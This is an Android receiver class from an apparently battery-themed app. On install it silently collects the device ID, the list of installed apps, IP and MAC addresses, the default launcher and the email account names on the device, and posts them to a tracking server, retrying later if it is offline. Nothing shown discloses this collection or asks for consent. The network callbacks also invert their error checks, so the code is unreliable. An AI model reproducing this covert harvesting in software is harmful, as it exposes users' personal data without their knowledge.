package com.receptix.batterybuddy.receiver;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.util.Patterns;

import com.clevertap.android.sdk.CleverTapAPI;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import com.koushikdutta.async.future.FutureCallback;
import com.koushikdutta.ion.Ion;
import com.receptix.batterybuddy.BuildConfig;
import com.receptix.batterybuddy.helper.InternetUtils;
import com.receptix.batterybuddy.helper.LogUtil;
import com.receptix.batterybuddy.helper.MCrypt;
import com.receptix.batterybuddy.helper.UserSessionManager;
import com.receptix.batterybuddy.helper.Utils;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.net.URLDecoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

import static com.receptix.batterybuddy.helper.Constants.JsonProperties.AUTH_KEY;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DATA;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEFAULT_LAUNCHER;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_ID;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_INFO;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.EMAILS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.ETHERNET;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.INSTALLED_APPS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.IP_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.MAC_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.WLAN;
import static com.receptix.batterybuddy.helper.Constants.Params.APP_NAME;
import static com.receptix.batterybuddy.helper.Constants.Params.FCM_TOKEN;
import static com.receptix.batterybuddy.helper.Constants.Params.REFERRER;
import static com.receptix.batterybuddy.helper.Constants.Params.REFERRER_JSON_OBJECT;
import static com.receptix.batterybuddy.helper.Constants.Params.STATUS_SUCCESS;
import static com.receptix.batterybuddy.helper.Constants.Urls.URL_TRACKING_OZOCK_INSTALLED;
import static com.receptix.batterybuddy.helper.Constants.Urls.URL_UPDATE_FCM_TOKEN;
import static com.receptix.batterybuddy.helper.Constants.UtmParams.EXPECTED_PARAMETERS;
import static com.receptix.batterybuddy.helper.Constants.UtmParams.PREFS_FILE_NAME;
import static com.receptix.batterybuddy.helper.Constants.UtmParams.UTM_CAMPAIGN;
import static com.receptix.batterybuddy.helper.Constants.UtmParams.UTM_MEDIUM;
import static com.receptix.batterybuddy.helper.Constants.UtmParams.UTM_SOURCE;

/**
 * Created by hello on 5/23/2017.
 */

public class InstallReferrerReceiver extends BroadcastReceiver {

    JsonObject jsonObject = new JsonObject();
    String utm;
    String utm_source, utm_medium, utm_campaign, utm_term, utm_content, utm_anid;
    private String TAG = InstallReferrerReceiver.class.getSimpleName();
    String deviceId, authKey, packageName = "";
    private boolean isInstallReferrerDataSent = false;
    private boolean isFCMDataSent = false;

    @Override
    public void onReceive(final Context context, Intent intent) {

        try {

            Log.e(TAG, "onReceive()");

            // invoke clever tap receiver from within the Custom Receiver class
            new com.clevertap.android.sdk.InstallReferrerBroadcastReceiver().onReceive(context, intent);

            final String referrer = intent.getStringExtra("referrer");

            getUtmParameters(context, referrer);

            jsonObject.addProperty(REFERRER, referrer);
            jsonObject.addProperty(APP_NAME, context.getPackageName());
            fetchUserDetails(context);

            if(InternetUtils.isInternetConnected(context))
            {
                //send Install Referrer Data to Server
                sendReferrerDataToServer(jsonObject.toString(), context);
            }
            else
            {
                Log.e(TAG, "No Internet Connection");
                // in case, install referrer and FCM Token were not sent due to unavailability of Internet,
                // we'll resend those parameters whenever Internet connection is obtained in background
                if(context!=null)
                {
                    UserSessionManager userSessionManager = new UserSessionManager(context);
                    if(userSessionManager!=null)
                    {
                        //save Json Data to SharedPrefs
                        userSessionManager.setReferrerJsonData(jsonObject.toString());
                        // mark "is referrer data sent once" to false, to check in ScreenListenerService
                        userSessionManager.setReferrerDataSentOnce(false);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendReferrerDataToServer(final String jsonObject, final Context context) {
        Log.e(TAG, "sendReferrerDataToServer => " + jsonObject);
        Ion.with(context)
                .load(URL_TRACKING_OZOCK_INSTALLED)
                .setBodyParameter("data", jsonObject)
                .asJsonObject()
                .setCallback(new FutureCallback<JsonObject>() {
                    @Override
                    public void onCompleted(Exception networkCallException, JsonObject result) {
                        if(networkCallException!=null)
                        {
                            Log.e(TAG, "install.php => NO EXCEPTION");
                            Log.e(TAG, "install.php => onCompleted()");
                            if(result!=null)
                            {
                                boolean hasStatus = result.has("status");
                                if(hasStatus)
                                {
                                    String status = String.valueOf(result.get("status"));
                                    if(status.equalsIgnoreCase("1"))
                                    {
                                        isInstallReferrerDataSent = true;
                                        SendFCMDataNow(context);
                                    }
                                }
                            }
                        }
                        else
                        {
                            // if FCM Update Network Call Fails, save Referrer Object to SharedPrefs for sending later
                            Log.e(TAG, "isInstallReferrerDataSent = "+false);
                            UserSessionManager userSessionManager = new UserSessionManager(context);
                            //save Json Data to SharedPrefs
                            userSessionManager.setReferrerJsonData(jsonObject);
                            // mark "is referrer data sent once" to false, to check in ScreenListenerService
                            userSessionManager.setReferrerDataSentOnce(false);
                        }


                        if(BuildConfig.DEBUG)
                        {
                            isInstallReferrerDataSent = true;
                            SendFCMDataNow(context);
                        }
                    }
                });
    }

    private void SendFCMDataNow(Context context) {
        final UserSessionManager userSessionManager = new UserSessionManager(context);
        final JsonObject jsonObject = new JsonObject();
        String fcmToken = userSessionManager.getToken();
        jsonObject.addProperty(FCM_TOKEN, fcmToken);
        jsonObject.addProperty(APP_NAME, context.getPackageName());
        jsonObject.addProperty(DEVICE_ID, deviceId);
        jsonObject.addProperty(AUTH_KEY, authKey);
        Log.e(TAG + " update_fcm.php =>",jsonObject.toString());
        Ion.with(context)
                .load(URL_UPDATE_FCM_TOKEN)
                .setBodyParameter(DATA, jsonObject.toString())
                .asJsonObject()
                .setCallback(new FutureCallback<JsonObject>() {
                    @Override
                    public void onCompleted(Exception networkCallException, JsonObject result) {
                        if(networkCallException != null)
                        {
                            Log.e(TAG, "update_fcm.php => NO EXCEPTION");
                            // mark "referrerDataSentOnce" to true (so that install data is not sent again and again)
                            userSessionManager.setReferrerDataSentOnce(true);
                            isFCMDataSent = true;
                            Log.e(TAG, "isFCMDataSent = "+ isFCMDataSent);
                        }
                        else
                        {
                            Log.e(TAG, "update_fcm.php => EXCEPTION");
                            //save Json Data to SharedPrefs
                            userSessionManager.setReferrerJsonData(jsonObject.toString());
                            // mark "is referrer data sent once" to false, to check in ScreenListenerService
                            userSessionManager.setReferrerDataSentOnce(false);
                        }
                    }
                });
    }

    /**
     * Extract Query Parameters from Referral URL String and store in Shared Preferences into a HashMap
     * @param context
     * @param referrer
     */
    private void getUtmParameters(Context context, String referrer) {
        if (referrer != null) {
            Map<String, String> referralParams = new HashMap<String, String>();
            try {
                utm = URLDecoder.decode(referrer, "UTF-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }

            // Parse the query string, extracting the relevant data
            String[] params = utm.split("&"); // $NON-NLS-1$
            for (String param : params) {
                String[] pair = param.split("="); // $NON-NLS-1$
                referralParams.put(pair[0], pair[1]);
            }
            storeReferralParams(context, referralParams);
        }
    }

    private void fetchUserDetails(Context context) {
        getUserDeviceId(context);
        getListOfInstalledAppsOnUserDevice(context);
        getIpAddressAndMacAddress(context);
        getDefaultLauncherName(context);
        getEmailAccountsList(context);
        getUtmParametersFromPreferences(context);
    }

    private void getEmailAccountsList(Context context) {
        // Get user account (synced accounts on device)
        try {
            Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
            Account[] accounts = AccountManager.get(context).getAccounts();
            JsonArray userAccounts = new JsonArray();

            for (Account account : accounts) {
                if (emailPattern.matcher(account.name).matches()) {
                    String possibleEmail = account.name;
                    JsonPrimitive jsonPrimitive = new JsonPrimitive(possibleEmail);
                    userAccounts.add(jsonPrimitive);
                }
            }
            jsonObject.add(EMAILS, userAccounts);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getUserDeviceId(Context context) {
        // get DEVICE ID
        String userDeviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        jsonObject.addProperty(DEVICE_ID, userDeviceId);

        deviceId = userDeviceId;

        try {
            // encrypt device Id to make Auth Key
            MCrypt mCrypt = new MCrypt();
            String authorizationKey = MCrypt.bytesToHex(mCrypt.encrypt(userDeviceId));
            jsonObject.addProperty(AUTH_KEY, authorizationKey);

            authKey = authorizationKey;

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getListOfInstalledAppsOnUserDevice(Context context) {
        // get list of installed apps on user device
        try {
            JsonArray installedAppsList = new JsonArray();
            List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
            for (int i = 0; i < packList.size(); i++) {
                PackageInfo packInfo = packList.get(i);
                if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String appName = packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString();
                    JsonPrimitive jsonPrimitive = new JsonPrimitive(appName);
                    installedAppsList.add(jsonPrimitive);
                }
            }
            jsonObject.add(INSTALLED_APPS, installedAppsList);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getIpAddressAndMacAddress(Context context) {
        // get user device information (Mac Address, IP Address, OS Name etc.)
        try {
            StringBuilder deviceInfoStringBuilder = new StringBuilder();
            deviceInfoStringBuilder.append("Android Version : ").append(Build.VERSION.RELEASE);

            Field[] fields = Build.VERSION_CODES.class.getFields();
            String osName = fields[Build.VERSION.SDK_INT + 1].getName();
            deviceInfoStringBuilder.append(" OS Name :").append(osName);

            jsonObject.addProperty(DEVICE_INFO, deviceInfoStringBuilder.toString());

            String deviceIpAddress = Utils.getIPAddress(true);
            jsonObject.addProperty(IP_ADDRESS, deviceIpAddress);

            String deviceMacAddress = Utils.getMACAddress(WLAN);
            if (deviceMacAddress.length() == 0) {
                deviceMacAddress = Utils.getMACAddress(ETHERNET);
            }
            jsonObject.addProperty(MAC_ADDRESS, deviceMacAddress);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getDefaultLauncherName(Context context) {
        // get the default launcher on user device
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            ResolveInfo defaultLauncher = context.getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
            String defaultLauncherStr = defaultLauncher.activityInfo.packageName;
            jsonObject.addProperty(DEFAULT_LAUNCHER, defaultLauncherStr);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getUtmParametersFromPreferences(Context context) {
        HashMap<String, String> params = (HashMap<String, String>) retrieveReferralParams(context);
        if(params!=null && !params.isEmpty())
        {
            try {
                utm_source = params.get(UTM_SOURCE).replace("%20", " ").replace("%2B", " ");
                jsonObject.addProperty(UTM_SOURCE, utm_source);
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                utm_medium = params.get(UTM_MEDIUM).replace("%20", " ").replace("%2B", " ");
                jsonObject.addProperty(UTM_MEDIUM, utm_medium);
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                utm_campaign = params.get(UTM_CAMPAIGN).replace("%20", " ").replace("%2B", " ");
                jsonObject.addProperty(UTM_CAMPAIGN, utm_campaign);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void storeReferralParams(Context context, Map<String, String> params) {
        SharedPreferences storage = context.getSharedPreferences(PREFS_FILE_NAME, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = storage.edit();
        for (String key : EXPECTED_PARAMETERS) {
            String value = params.get(key);
            if (value != null) {
                editor.putString(key, value);
            }
        }
        editor.commit();
    }

    public static Map<String, String> retrieveReferralParams(Context context) {
        HashMap<String, String> params = new HashMap<String, String>();
        SharedPreferences storage = context.getSharedPreferences(PREFS_FILE_NAME, Context.MODE_PRIVATE);
        for (String key : EXPECTED_PARAMETERS) {
            String value = storage.getString(key, null);
            if (value != null) {
                params.put(key, value);
            }
        }
        return params;
    }

}
